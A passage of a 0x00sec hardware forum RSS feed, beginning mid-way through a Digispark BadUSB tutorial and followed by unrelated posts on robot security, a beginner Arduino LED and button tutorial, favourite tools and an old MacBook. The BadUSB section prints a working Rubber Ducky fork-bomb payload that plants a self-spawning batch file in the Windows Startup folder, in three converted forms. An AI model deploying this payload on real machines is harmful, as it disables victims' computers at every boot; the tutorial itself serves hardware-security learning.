sudo php -S 0.0.0.0:&lt;port&gt; -t digispark_remote
</code></pre>
<p>We use <em>-S 0.0.0.0</em> to enable a server on all network interfaces and we can choose any port we like, also we set the main directory of our temporary server as digispark_remote with the -t parameter. Our console will notify us when someone downloads the script so we’ll know when the script has been executed:</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/e/e99c8caef551cd640590648eb8c7e0327585595d.jpg" alt="0x00sec1" data-base62-sha1="xkCEHsvtuNamZF6jVRFnWMdRdx3" width="690" height="226"><br>
(old screenshot taken directly from my thesis because I’m too lazy to repeat the whole thing)</p>
<p>If you fancy any more pre-made scripts to study from or to use straight away CedArctic wrote some very interesting ones and you can find them <a href="https://github.com/CedArctic/DigiSpark-Scripts" rel="noopener nofollow ugc">here</a>.</p>
<p><strong>4. Can I use Rubber Ducky scripts on my Digispark?</strong></p>
<p>Not natively, but CedArctic comes to our rescue once again with his beautiful <a href="https://github.com/CedArctic/digiQuack" rel="noopener nofollow ugc">digiQuack</a>, a tool that converts scripts written in Ducky Script into scripts we can load on the Digispark. Alternatively, you can use toxydose’s <a href="https://github.com/toxydose/Duckyspark" rel="noopener nofollow ugc">Duckyspark</a>, which does the same thing, but digiQuack supports foreign keyboard layouts (foreign layouts won’t work with scripts written for the standard US layout!) and optimises the code for the Attiny85 so that it works faster and it doesn’t eats up too much space in EEPROM.</p>
<p>For example, let’s take the Fork Bomb script we can find in <a href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads" rel="noopener nofollow ugc">this great repository of Rubber Ducky payloads</a>:</p>
<pre><code>CONTROL ESCAPE
DELAY 200
STRING cmd
DELAY 200
MENU
DELAY 100
STRING a
ENTER
DELAY 200
LEFT
ENTER
DELAY 1000
STRING cd %ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\
ENTER
STRING copy con a.bat
ENTER
STRING @echo off
ENTER
STRING :START
ENTER
STRING start a.bat 
ENTER
STRING GOTO START
ENTER
CONTROL z
ENTER
STRING a.bat
ENTER
ALT F4
</code></pre>
<p>And let’s convert it using both programs: to use Duckyspark we need to type:</p>
<pre><code>python duckyspark_translator.py ducky_script.txt output_file
</code></pre>
<p>output_file will be created as a .ino file and this is the output we get by feeding it the Fork Bomb script:</p>
<pre><code>//generated by Duckyspark https://github.com/toxydose/Duckyspark

#include "DigiKeyboard.h"
#define KEY_ESC     41
#define KEY_BACKSPACE 42
#define KEY_TAB     43
#define KEY_PRT_SCR 70
#define KEY_DELETE  76
#define KEY_ARROW_RIGHT 0x4F
#define KEY_ARROW_DOWN  0x51
#define KEY_ARROW_UP    0x52

void setup()
{

    DigiKeyboard.delay(5000);
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.sendKeyStroke(KEY_ESC,MOD_CONTROL_LEFT | 0);
    DigiKeyboard.delay(200);
    DigiKeyboard.print(F("cmd"));
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(KEY_F10,MOD_SHIFT_LEFT);
    DigiKeyboard.delay(100);
    DigiKeyboard.print(F("a"));
    DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT,0);
    DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
    DigiKeyboard.delay(1000);
    DigiKeyboard.print(F("cd %ProgramData%")); DigiKeyboard.print(char(92));                 
    DigiKeyboard.print(F("Microsoft")); DigiKeyboard.print(char(92)); DigiKeyboard.print(F("Windows")); 
    DigiKeyboard.print(char(92)); DigiKeyboard.print(F("Start Menu")); DigiKeyboard.print(char(92)); 
    DigiKeyboard.print(F("Programs")); DigiKeyboard.print(char(92)); DigiKeyboard.print(F("Startup")); 
    DigiKeyboard.print(char(92)); DigiKeyboard.print(F(""));
    DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
    DigiKeyboard.print(F("copy con a.bat"));
    DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
    DigiKeyboard.print(F("@echo off"));
    DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
    DigiKeyboard.print(F(":START"));
    DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
    DigiKeyboard.print(F("start a.bat "));
    DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
    DigiKeyboard.print(F("GOTO START"));
    DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
    DigiKeyboard.sendKeyStroke(KEY_Z,MOD_CONTROL_LEFT | 0);
    DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
    DigiKeyboard.print(F("a.bat"));
    DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
    DigiKeyboard.sendKeyStroke(KEY_F4,MOD_ALT_LEFT | 0);

}


void loop()
{

}
</code></pre>
<p>We can observe immediately the different approach used by this program: incapsulating the entire payload inside the setup() function to make it execute only once instead of putting it into loop() like we did, in fact, the setup() function in an Arduino sketch contains the very first instructions to be executed by the controller, while loop() is called as soon as setup() finishes its course, and usually contains the actual body of the program, which, as the name suggests, is executed in an infinite loop. We can also see how at some point the program made a little mess when dealing with the string “cd %ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup”, it’s a little odd, but it should still work.</p>
<p>Our last test is going to be using digiQuack to convert the same payload, we can run digiQuack from our terminal (it has a different version for each OS, written in C++ instead of python) and it will ask us to input the path of our Rubber Ducky payload, then it will ask whether we want the payload to be executed once or in an infinite loop, so we answer just once and the program will create a file called converted.txt in the same folder of the executable, here’s its content:</p>
<pre><code>DigiKeyboard.sendKeyStroke(0);
DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT,41);
DigiKeyboard.delay(200);
DigiKeyboard.print(F("cmd"));
DigiKeyboard.delay(200);
DigiKeyboard.sendKeyStroke(101);
DigiKeyboard.delay(100);
DigiKeyboard.print(F("a"));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(200);
DigiKeyboard.sendKeyStroke(80);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
DigiKeyboard.print(F("cd %ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\"));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print(F("copy con a.bat"));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print(F("@echo off"));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print(F(":START"));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print(F("start a.bat "));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print(F("GOTO START"));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT,KEY_Z);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print(F("a.bat"));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT,KEY_F4);
for(;;){ /*empty*/ }
</code></pre>
<p>As we can see it’s a more compact and slightly more elegant code, it doesn’t contain any functions so it means we can wrap these lines of code inside either setup() or loop(), it’s our own choice, let’s just remember to include DigiKeyboard.h at the beginning of the file before compiling it.</p>
<p><strong>5. Conclusions</strong></p>
<p>And this is all I had to say for today, aside from the fact that if you wish to write scripts for other keyboard layouts you will have to edit the hardcoded numbers contained in DigiKeyboard.h to match the values of your desired layout, you can find the tables you need in <a href="http://www.usb.org/developers/hidpage/Hut1_12v2.pdf" rel="noopener nofollow ugc">this massive document about HID</a>, while <a href="https://github.com/digistump/DigisparkArduinoIntegration/blob/master/libraries/DigisparkKeyboard/DigiKeyboard.h" rel="noopener nofollow ugc">here</a> you can find the source code of said library if you want to take a look at how it works.</p>
<p>Thank you for reading this far, I’m always available to correct any errors and answer questions if there are any.</p>
<p>Rubber Ducky scripts: <a href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads" rel="noopener nofollow ugc">here</a><br>
Digispark scripts: <a href="https://github.com/CedArctic/DigiSpark-Scripts" rel="noopener nofollow ugc">here</a></p>
            <p><small>4 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/a-complete-beginner-friendly-guide-to-the-digispark-badusb/8002">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/a-complete-beginner-friendly-guide-to-the-digispark-badusb/8002</link>
          <pubDate>Sun, 12 Aug 2018 23:45:29 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-8002</guid>
          <source url="https://0x00sec.org/t/a-complete-beginner-friendly-guide-to-the-digispark-badusb/8002.rss">A Complete Beginner Friendly Guide To The Digispark BadUSB</source>
        </item>
        <item>
          <title>Robot hacking: the Robot Security Framework (RSF)</title>
          <dc:creator><![CDATA[alias]]></dc:creator>
          <category>Hardware</category>
          <description><![CDATA[
            <p>Hello everyone,</p>
<p>My group’s interests is in the intersection between robotics and security. After having been reading for a few months, this is my first post. I hope you find it somehow interesting. <em><strong>Disclaimer: I work at Alias Robotics</strong>.</em> I plan on starting to share a few bits here about our work. Hopefully it’ll be useful to some of you. In this first topic, I’d love to introduce the <strong>Robot Security Framework (RSF)</strong>.</p>
<p>In a nutshell, security in robotics is still a field that’s maturing. Popular robotic frameworks like the Robot Operating System (ROS) are starting to implement the first security measures however, it’ll be long until robots are secured appropriately. In an attempt to secure (or discover insecurity) on these machines, we made a study and proposed a framework to perform systematic security assessments in robot. The original framework is discussed at <a href="https://aliasrobotics.com/research/rsf.htm" rel="nofollow noopener">https://aliasrobotics.com/research/rsf.htm</a>. The content of it has also been formatted in a Github repository so that researcher can fork it and use it as a checkbox list when assessing robots. Find below a few useful links about it. Contributions (specially pull requests) are welcome.</p>
<ul>
<li><a href="https://aliasrobotics.com/research/rsf.htm" rel="nofollow noopener">RSF article</a></li>
<li><a href="https://github.com/aliasrobotics/RSF" rel="nofollow noopener">Github repository</a></li>
<li>and for those with an academic interest, <a href="https://arxiv.org/pdf/1806.04042.pdf" rel="nofollow noopener">here’s</a> the paper</li>
</ul>
            <p><small>4 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/robot-hacking-the-robot-security-framework-rsf/7922">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/robot-hacking-the-robot-security-framework-rsf/7922</link>
          <pubDate>Tue, 07 Aug 2018 20:32:55 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-7922</guid>
          <source url="https://0x00sec.org/t/robot-hacking-the-robot-security-framework-rsf/7922.rss">Robot hacking: the Robot Security Framework (RSF)</source>
        </item>
        <item>
          <title>Introduction to the Arduino Series</title>
          <dc:creator><![CDATA[fxbg]]></dc:creator>
          <category>Hardware</category>
          <description><![CDATA[
            <p><strong>My Introduction</strong><br>
First, I would like to thank 0x00sec for providing such a great community. I would also like to thank <a href="http://www.arrogantbrewing.com" rel="noopener nofollow ugc">Arrogant Bastard</a>, <a href="https://sierranevada.com/beer" rel="noopener nofollow ugc">Sierra Nevada</a> and <a href="http://deathwishcoffee.com" rel="noopener nofollow ugc">Deathwish Coffee</a> for providing the sustenance necessary for starting and completing the following series. Not only should you get drunk while completing these projects but you should consume the correct amount of coffee as well. It’s part of a well balanced diet (which includes ramen of course). You may also need bic lighters and your choice of tobacco, pre rolled cigarettes (like Marlboro) and my favorite, Zig Zag rolling papers.</p>
<p>I hold a degree in Information Systems (CIS), and am not an electrician or mechanical engineer. I have been creating software since 1998, so about 20 years. I run my own SEO and web development business and am creating this series to help this community grow and to help you, the reader, grow. I was creating software before the internet was blessed with PHP and when Oracle was still 8i. I am an old drunken tattooed programmer, so excuse the language if you’re a christian, excuse the drinking if you’re a teetotaler, and most importantly remember that I am always open to criticism, hate and suggestions.</p>
<p><strong>Arduino Series Introduction</strong><br>
The Arduino has made it possible for hundreds of thousands of people to create gadgets they normally otherwise wouldn’t have been able to build. The Arduino is a micro controller that allows you to assemble and create just about anything you can dream up. Arduinos can be bought for dirt cheap online (<a href="https://www.ebay.com/sch/i.html?_from=R40&amp;_trksid=p2380057.m570.l1311.R4.TR12.TRC2.A0.H0.Xarduino+un.TRS0&amp;_nkw=arduino+uno+r3&amp;_sacat=0" rel="noopener nofollow ugc">ebay</a>, <a href="https://www.amazon.com/s/ref=nb_sb_ss_i_3_10?tag=0x00sec03-20" rel="noopener nofollow ugc">amazon</a>) and there are even resources to <a href="http://www.instructables.com/id/Build-Your-Own-Arduino/" rel="noopener nofollow ugc">create your own Arduino</a> using schematics provided by the Arduino team.</p>
<p>I will be using Ubuntu (Xenial) as the operating system of my choice. I will not be covering anything under the Windows operating system. I will also not be using any of the online Arduino compilers/Uploaders such as the one at <a href="https://create.arduino.cc" rel="noopener nofollow ugc">arduino.cc</a>. I will also use the words method and function interchangeably, as they mean the same thing. Some language (such as C#) call them methods and some languages prefer to call them functions (like PHP).</p>
<p>This series will walk you through creating projects with the Arduino. The projects will be more advanced the further we dive into the Arduino. This series will require you to have certain sensors and and hardware required to complete the projects. I will provide links to websites to purchase the sensors and hardware, and of course, I will keep price in mind. Most sensors and “shields” for the Arduino are inexpensive. Some of the sensors and components we will be integrating will be:</p>
<ul>
<li><a href="https://www.gearbest.com/goods/pp_009979800776.html" rel="noopener nofollow ugc">LCD screens</a></li>
<li>Heat and Temperature</li>
<li>Light</li>
<li>Flame</li>
<li>Buttons</li>
<li><a href="https://www.gearbest.com/goods/pp_009268601400.html" rel="noopener nofollow ugc">WiFi</a></li>
<li><a href="https://www.gearbest.com/goods/pp_009101055960.html" rel="noopener nofollow ugc">Sound detectors</a></li>
<li><a href="https://www.gearbest.com/goods/pp_009542167908.html" rel="noopener nofollow ugc">Lasers</a></li>
<li><a href="https://www.gearbest.com/goods/pp_009369146062.html" rel="noopener nofollow ugc">Cameras</a></li>
<li>Dot Matrixes</li>
<li>etc etc</li>
</ul>
<p><strong>Pre-requisites</strong></p>
<ul>
<li>It is assumed that you have a basic understanding of the C programming language. If you don’t know anything about programming, you may not make it very far in this series.</li>
<li>You will need a laptop/desktop computer capable of running the Arduino IDE.</li>
<li>I will be using an Arduino Uno R3. You can use another type of Arduino provided you understand the pinouts and voltages required for the upcoming projects/articles.</li>
<li>A breadboard</li>
<li>Jumper wires</li>
<li>An Arduino board</li>
</ul>
<p><strong>Getting Started</strong><br>
First, let’s install the IDE and get it up and connected to the board.</p>
<blockquote>
<p>sudo apt-get -y install arduino</p>
</blockquote>
<p>Once it is installed, open the IDE and connect the Arduino via the USB cable. You will need to make sure the correct board is chosen from the <strong>Tools</strong> menu.</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/9/9230ea01564e93ce7baba2c099ca59a47cec4088.jpg" alt="png" data-base62-sha1="kRgvx9xOc4lK0r4xKQPBJbj6Iac" width="690" height="387"></p>
<p>The Arduino’s code that we will upload is called a sketch. You can find many many free sketches online for all sorts of things. The code is a set of C and C++, so knowing C will help you greatly and YES you must know the basics of C. You could learn along the way but I strongly suggest learning it before continuing this series. So let’s take a look at the Arduino.</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/0/07f0c2673854d4a71fdd35d95336cc4d98b25e06.jpg" alt="IMG_20180527_012959" data-base62-sha1="18falzp1M7RI5HPo5iVYCWQeqmW" width="690" height="388"><br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/6/6f9ea8f61110736c9cbccb8581eea3269a4adb7b.jpg" alt="IMG_20180527_012959-2" data-base62-sha1="fVqVshrYtIFiOXzKq2T0KZYfPHt" width="690" height="388"></p>
<ol>
<li>Reset button</li>
<li>Digital pins</li>
<li>USB connector</li>
<li>AT Mega 328P (<a href="http://ww1.microchip.com/downloads/en/DeviceDoc/Atmel-42735-8-bit-AVR-Microcontroller-ATmega328-328P_Datasheet.pdf" rel="noopener nofollow ugc">data sheet</a>)</li>
<li>DC power connector</li>
</ol>
<p>The reset button will reset the board, replaying the sketch from the beginning. The digital pins you need to know about right now, (from left to right as pictured) are GND for ground and 13 to 0. We might cover the AREF pin later on (this pin is for Analog reference). The pins on the other side is for Analog, which we will use later as well.</p>
<p><strong>Voltage and Dangers</strong><br>
The Arduino outputs 5 volts. This is indeed what is referred to as “low voltage”. Nothing we do here will involve “mains” voltage, which could kill you. We will be using sensors that could possibly burnt he shit out of you and cause you to go blind momentarily, but I assure you, you will be okay. For example, if your pumping 5 volts into a sensor that requires 1 volt or half a volt and you touch it, you will probably be burned. Be careful and use your head brain.</p>
<p><strong>Your First LED Blink</strong><br>
Our first project will be something very simple, to get you familiar with the coding and uploading process. We will use a very simple LED project, which is normally the first thing you do in any other “hello world” type Arduino project. So you will need an <a href="https://en.wikipedia.org/wiki/Light-emitting_diode" rel="noopener nofollow ugc">LED</a> for this one, like my red one below. We won’t even need a breadboard for this one.</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/9/9dd695ea11fce4e062f75bffb80cc08906503dfc.jpg" alt="IMG_20180527_021727" data-base62-sha1="mwiI2KRp73Sytm3JJIW2Eff6OdK" width="690" height="388"></p>
<p>As you can see, there is one little prong longer than the other. This is what distinguishes the positive from the ground. The bottom one, which is the longer one, is called the <strong>anode</strong> and the shorter one we are going to ground is the <strong>cathode</strong>. Some LED’s even have a flat spot on the casing which can help identify which one is which, one side won’t always be longer in some cases.</p>
<p>Take this LED and put the longer end (positive) into pin 13 on your Arduino. Pin 13 is right next to the ground, your LED should be able to fit in both, like below:</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/f/f97e196c5cfe8f8b68aa3f55d163f0d8c71a2f2b.jpg" alt="IMG_20180527_022525" data-base62-sha1="zB73vPjM3zNYnFpve7LkgkzSdB1" width="690" height="388"></p>
<p>Now, we are ready for some easy code. You can go ahead and copy and paste the following code into the IDE.</p>
<pre><code class="lang-auto">void setup()
{
  pinMode(13, OUTPUT);
}

void loop()
{
  digitalWrite(13,HIGH);
  delay(2000);
  digitalWrite(13, LOW);
  delay(2000);
}
</code></pre>
<p>There are two functions above, <strong><a href="https://www.arduino.cc/reference/en/language/structure/sketch/setup/" rel="noopener nofollow ugc">setup</a></strong> and <strong><a href="https://www.arduino.cc/reference/en/language/structure/sketch/loop/" rel="noopener nofollow ugc">loop</a></strong>. The setup function is used to declare variables and is run when the sketch starts. The loop function will, as you may have guessed it, loop over and over again. These functions will be used often and probably in every project we do.</p>
<p>In the setup function we are setting up pin 13 to be used an output, meaning voltage will be output to this pin. You can tell that <em>OUTPUT</em> is a constant, since it’s in all capitals. In the loop function we are sending the <em>HIGH</em> signal to pin 13, waiting 2000ms (2 seconds), sending the <em>LOW</em> signal, then waiting another 2000ms. Once it reached the end it will loop again, over and over again. Once this is uploaded to the board, you should have a fancy blinking light, which isn’t much of anything, but at least you got your “hello world” out of the way.</p>
<p>Once the code is in place, your Arduino is plugged into the USB and you have the correct com selected, upload the sketch to the board. There is a button on the top bar that has an arrow pointing to the right, this is the upload button. When you hover over the button, you should see it’s meaning in the status bar. If the upload fails, you will see error messages at the bottom of the IDE, probably in the color red.</p>
<p><strong>Serial Monitor</strong><br>
The Serial Monitor is a console area where you can write debug stuff too. This window is very helpful for debugging. You can access it by pressing <strong>Ctrl+Shift+M</strong>. The serial monitor is not active by default. We need to activate it by using the Serial.begin() method. In the setup function is where you need to activate it.</p>
<pre><code class="lang-auto">Serial.begin(9600);
</code></pre>
<p>When you want to log something to the console (serial monitor) you will use the <strong><a href="https://www.arduino.cc/en/serial/println" rel="noopener nofollow ugc">println</a></strong> method. Here is an example of how to use it with the code we already have in place:</p>
<pre><code class="lang-auto">void setup()
{
  pinMode(13, OUTPUT);
  Serial.begin(9600);
}

void loop()
{
  digitalWrite(13,HIGH);
  Serial.println("LED is on");
  delay(2000);
  
  digitalWrite(13, LOW);
  Serial.println("LED is off");
  delay(2000);
}
</code></pre>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/1/165adb4147598f382a7c61e36bb6619bf0211304.jpg" alt="png" data-base62-sha1="3bLa8dt8BEMEjy2sUTTqN3xXFWY" width="690" height="387"></p>
<p>Remember, you don’t need to save the sketch to upload it. You will need to upload it after you enter new code, the hotkey for that is <strong>Ctrl+u</strong>, or like earlier, press the upload button.</p>
<p><strong>Breadboards</strong><br>
Breadboards are a place you can “prototype” your electronics before soldering them. We will do most of our work on breadboards so it is important to understand how they work. My breadboard has a sticky back on it (obviously to stick it in place somewhere). I chose not to stick it down since I am usually mobile.</p>
<p><strong>Your First Button</strong><br>
Here is what you will need for this:</p>
<ul>
<li>1 Button</li>
<li>1 Breadboard</li>
<li>10k Ohm Resister</li>
<li>5 Jumper wires</li>
</ul>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/d/dca2b41077912c3149e3dfe1f643b3fb81032af7.jpg" alt="IMG_20180527_032015" data-base62-sha1="vtPDiC6tGZ9vyS6MqA5U8cFZPgz" width="690" height="388"></p>
<p>You will notice that there is 2 lines, one red and one blue. The red line has a plus sign (positive) and the blue has a minus sign (for ground). When we power things on the breadboard will be putting the output voltage into the red line.</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/a/aee1f71a7a8d64757f0ebf02fc85858a005f7cb4.jpg" alt="IMG_20180527_032641" data-base62-sha1="oX5cUcraDHoLxKMGZWhqqkmK1Mw" width="690" height="388"></p>
<p>Above is the button I will be attaching to the breadboard. This can be a pain in the ass depending on how cheap your breadboard is. My breadboard is pretty cheap so it may take some wiggling to get it in the right place and secure. The button has 4 <strong>legs</strong> (pins) on the bottom.</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/7/79e31d4949559e5a40c9ff1a7707200e79fedd8c.jpg" alt="IMG_20180527_033020" data-base62-sha1="hogmAioPmkSXcMdDcdqsa0cCkd6" width="690" height="388"></p>
<p>Our button will have 1 leg fed 5 volts, this leg will have the resistor on it, which we will ground out. We will use another leg to get the button’s state to to connect the circuit to our LED on pin 13. So, just like in our first LED project, go ahead and connect the LED back to pin 13 and the ground, directly onto the Arduino itself.</p>
<p>Now, let’s add the resistor. I cut mine down so it looks nice and neat on the board, and keeps it tight and together. I am not using a 10k ohm, I am using a 220. You can tell by the colored bands on the resistor what it is. You should still use a 10k for best (non buggy) results.</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/e/e9b60f78317418d328e59addc5f6f5575153c649.jpg" alt="IMG_20180527_040645" data-base62-sha1="xlvjqfU9dwsdy9NRi64aJ2qDrmx" width="690" height="388"></p>
<p>Next, from the pin that says 5v (on the other side of the digital pins) on the analog side, run a jumper wire into the red (positive) side of our breadboard.</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/7/72c7b33ef1e567e1b37d306b9d4deca7219011d6.jpg" alt="IMG_20180527_041000" data-base62-sha1="gnohOlHKfdxA5cTkSC0lGwipUnc" width="690" height="388"></p>
<p>Next, connect a jump from GND (ground) to the blue line (negative/ground).</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/a/a56d0b117d1398728ca962aea13f37d7f89a283a.jpg" alt="IMG_20180527_041238" data-base62-sha1="nBqpdgYh70hU16wOaluXyW9MBV8" width="690" height="388"></p>
<p>Now, ground off the resistor</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/9/941a7933713d8a2bb60115ffbc259ba62d1f4cf6.jpg" alt="IMG_20180527_041410" data-base62-sha1="l8bnQPNf1FJEfSE394poW1G9qo6" width="690" height="388"></p>
<p>Feed our last leg into the digital side of the Arduino in pin 7.</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/a/a1f6ed3d684688778c491afd251a72a151a55952.jpg" alt="IMG_20180527_041614" data-base62-sha1="n6NUt6ftskyl4EzYPYFALocKVi2" width="690" height="388"></p>
<p>Our button will have two states, not pressed and pressed. Everything should be in place now, go ahead and put the code below in the IDE and upload it to the board.</p>
<pre><code class="lang-auto">const int btnPin = 7;
const int led =  13;
int btnState = 0;

void setup() {
  pinMode(led, OUTPUT);
  pinMode(btnPin, INPUT);
}

void loop() {
  btnState = digitalRead(btnPin);

  if (btnState == HIGH) {
    digitalWrite(ledPin, HIGH);
  } else {
    digitalWrite(ledPin, LOW);
  }
}
</code></pre>
<p>Now you can have fun pressing a button to turn on your LED. How fun huh? Yea, not exciting but you gotta start somewhere. The code to me is self explanatory but for shits and giggles, let’s run through it. In the setup function we are setting pin 13 as our output and pin 7 as our input, which is our button. In the main loop we have a conditional that is checking if our button is being pressed or not. If the button is pressed send the HIGH signal (send voltage to the LED), if it’s not pressed, send the LOW signal, turning the LED off. Well, not so much turning it off but not giving it any voltage.</p>
<p><strong>What’s Next</strong><br>
Next in this Arduino series I will show you how to use a 7 segment LED, potentiometers, sound detection and temperature detection. I will also go into reading schematics, writing schematics and using <a href="http://fritzing.org/home/" rel="noopener nofollow ugc">Fritzing</a>.</p>
<p>Remember, you should always drink beer, run with scissors, throw change at rich people and keep coding.</p>
            <p><small>17 posts - 8 participants</small></p>
            <p><a href="https://0x00sec.org/t/introduction-to-the-arduino-series/6848">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/introduction-to-the-arduino-series/6848</link>
          <pubDate>Sun, 27 May 2018 11:41:03 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-6848</guid>
          <source url="https://0x00sec.org/t/introduction-to-the-arduino-series/6848.rss">Introduction to the Arduino Series</source>
        </item>
        <item>
          <title>Let&#39;s discuss our favorite tools!</title>
          <dc:creator><![CDATA[afiskon]]></dc:creator>
          <category>Hardware</category>
          <description><![CDATA[
            <p>Here is what I use most often these days:</p>
<ul>
<li>STM32 Nucleo F411RE development board <a href="http://www.st.com/en/evaluation-tools/nucleo-f411re.html" rel="nofollow noopener">http://www.st.com/en/evaluation-tools/nucleo-f411re.html</a>
</li>
<li>IceStorm + BlackIce II, ICE40 FPGA development board <a href="https://www.tindie.com/products/Folknology/blackice-ii/" rel="nofollow noopener">https://www.tindie.com/products/Folknology/blackice-ii/</a>
</li>
<li>BusPirate v4 <a href="https://www.seeedstudio.com/Bus-Pirate-v4-p-740.html" rel="nofollow noopener">https://www.seeedstudio.com/Bus-Pirate-v4-p-740.html</a>
</li>
<li>Sigrok / PulseView + DSLogic logic analyzer <a href="https://www.ebay.com/itm/USB-Logic-DSLogic-Basic-Analyzer-16Ch-100MHz-4Ch-400MHz-Xilinx-Spartan-6-FPGA/182242758729" rel="nofollow noopener">https://www.ebay.com/itm/USB-Logic-DSLogic-Basic-Analyzer-16Ch-100MHz-4Ch-400MHz-Xilinx-Spartan-6-FPGA/182242758729</a>
</li>
<li>Rigol DS1054Z oscilloscope (“overcloked” 100 MHz version) <a href="https://www.amazon.com/Rigol-DS1054Z-Digital-Oscilloscopes-Bandwidth/dp/B012938E76?tag=0x00sec03-20" rel="nofollow noopener">https://www.amazon.com/Rigol-DS1054Z-Digital-Oscilloscopes-Bandwidth/dp/B012938E76</a>
</li>
<li>RTL-SDR v3 <a href="https://www.rtl-sdr.com/buy-rtl-sdr-dvb-t-dongles/" rel="nofollow noopener">https://www.rtl-sdr.com/buy-rtl-sdr-dvb-t-dongles/</a>
</li>
<li>LimeSDR <a href="https://www.crowdsupply.com/lime-micro/limesdr" rel="nofollow noopener">https://www.crowdsupply.com/lime-micro/limesdr</a>
</li>
</ul>
<p>And what are your favorite devices and software?</p>
            <p><small>3 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/lets-discuss-our-favorite-tools/6175">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/lets-discuss-our-favorite-tools/6175</link>
          <pubDate>Thu, 05 Apr 2018 09:56:19 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-6175</guid>
          <source url="https://0x00sec.org/t/lets-discuss-our-favorite-tools/6175.rss">Let&#39;s discuss our favorite tools!</source>
        </item>
        <item>
          <title>What do do with a old MacBook Pro?</title>
          <dc:creator><![CDATA[rndm_stranger]]></dc:creator>
          <category>Hardware</category>
          <description><![CDATA[
            <p>Hey,</p>
<p>I have an old MacBook Pro (Late 2010) laying around since it got me an new one in September. The battery drains pretty fast, but otherwise it is in very good conditions. Does anyone have a idea what project I might can realise with it? I don´t want to throw a perfectly fine computer away just because I don’t need it anymore.</p>
<p>Thanks</p>
            <p><small>13 posts - 11 participants</small></p>
            <p><a href="https://0x00sec.org/t/what-do-do-with-a-old-macbook-pro/5785">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/what-do-do-with-a-old-macbook-pro/5785</link>
          <pubDate>Sat, 10 Mar 2018 10:54:49 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-5785</guid>
          <source url="https://0x00sec.org/t/what-do-do-with-a-old-macbook-pro/5785.rss">What do do with a old MacBook Pro?</source>
        </item>
        <item>
          <title>Who think LEDs Are simple?</title>
          <dc:creator><![CDATA[vbhs]]></dc:creator>
          <category>Hardware</category>
          <description><![CDATA[
            <p>Hi,<br>
